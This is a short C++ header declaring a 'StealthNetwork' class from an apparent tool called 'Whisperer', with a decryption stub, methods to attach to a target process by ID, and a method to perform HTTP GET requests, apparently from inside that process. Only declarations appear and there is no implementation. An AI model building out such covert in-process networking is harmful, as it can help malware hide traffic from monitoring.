#ifndef __STEALTH_NETWORK_
#define __STEALTH_NETWORK_

#ifndef __WHISPERER_SHARED_
#include "WhispererShared.h"
#endif

#ifndef __WHISPERER_HOST_BLOCK_
#include "HostBlock.h"
#endif

#ifndef __NETWORK_HELPER_
#include "NetworkHelper.h"
#endif

#define STARTUP_CALL_EBX 0x88ffff34
#define STARTUP_CALL_EDX 0x90f80f03


class StealthNetwork {
private:
	PUCHAR DecryptionStub;
	ULONG DecryptionLength;
	PWHISPERER_FUNCTIONS WhispererFunctions;
	NetworkHelpers *NetHelp;
	bool Attached;

public:
	WhispererHostBlock *HostBlock;
	PWHISPERER_FRAMEWORK Framework;
	
	ULONG ProcessId;
	HANDLE ProcessHandle;

	bool ProcessAlive;


	StealthNetwork(bool *NetworkActive);
	~StealthNetwork();

	BOOLEAN AttachProcess(ULONG TargetProcessId);
	VOID DetachProcess();
	VOID PerformHttpGet(LPCSTR Url, PUCHAR *BodyOut, ULONG *LengthOut);
};





#endif

